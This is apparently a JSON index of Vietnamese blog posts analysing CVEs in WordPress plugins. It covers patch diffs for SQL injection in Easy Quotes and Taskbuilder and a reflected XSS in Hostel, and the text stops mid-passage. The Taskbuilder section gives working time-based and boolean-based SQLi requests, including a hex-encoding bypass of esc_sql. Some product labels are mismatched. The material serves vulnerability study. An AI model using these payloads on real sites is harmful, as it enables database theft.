kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM 